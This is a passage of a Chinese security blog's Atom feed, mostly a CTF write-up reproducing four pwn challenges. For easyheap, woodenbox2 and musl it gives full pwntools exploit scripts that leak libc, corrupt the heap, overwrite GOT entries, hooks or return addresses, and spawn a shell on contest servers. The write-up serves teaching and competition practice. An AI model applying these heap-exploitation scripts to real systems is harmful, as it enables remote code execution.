      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
